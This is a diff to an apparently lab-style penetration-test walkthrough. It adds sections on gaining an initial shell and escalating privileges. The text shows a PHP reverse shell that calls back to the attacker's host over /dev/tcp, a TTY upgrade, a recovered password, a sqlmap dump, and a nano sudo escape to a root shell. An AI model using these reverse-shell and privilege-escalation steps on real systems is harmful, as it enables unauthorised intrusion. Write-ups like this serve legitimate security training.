@@ -111,6 +111,8 @@ sudo sqlmap -r request.req --current-db gallery_db --tables -T users  -C usernam
 
 <figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Shell
+
 I was able to upload a php reverse shell instead of an image
 
 **Kali**
@@ -133,11 +135,10 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
 
 Get autocomplete
 
-```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-ctrl + Z
+<pre><code><strong>python3 -c 'import pty; pty.spawn("/bin/bash")'
+</strong>ctrl + Z
 stty raw -echo;fg
-```
+</code></pre>
 
 <figure><img src="../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>
 
@@ -156,13 +157,32 @@ Password: b3stpassw0rdbr0xx
 
 <figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>
 
+## Privilege Escalation&#x20;
 
+**Exploit:** [https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/)
 
+mike is able to run a script with NOPASSWD, looking at the script it, there are a few options to select. One option is to run nano which we can use to get sudo. I also noticed my terminal would not open nano so I exported xterm
 
+**Victim**
 
+```
+sudo -l
+export TERM="xterm"
+```
 
+<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+sudo /bin/bash /opt/rootkit.sh
+^R^X
+reset; sh 1>&0 2>&0
+```
 
+<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>
 
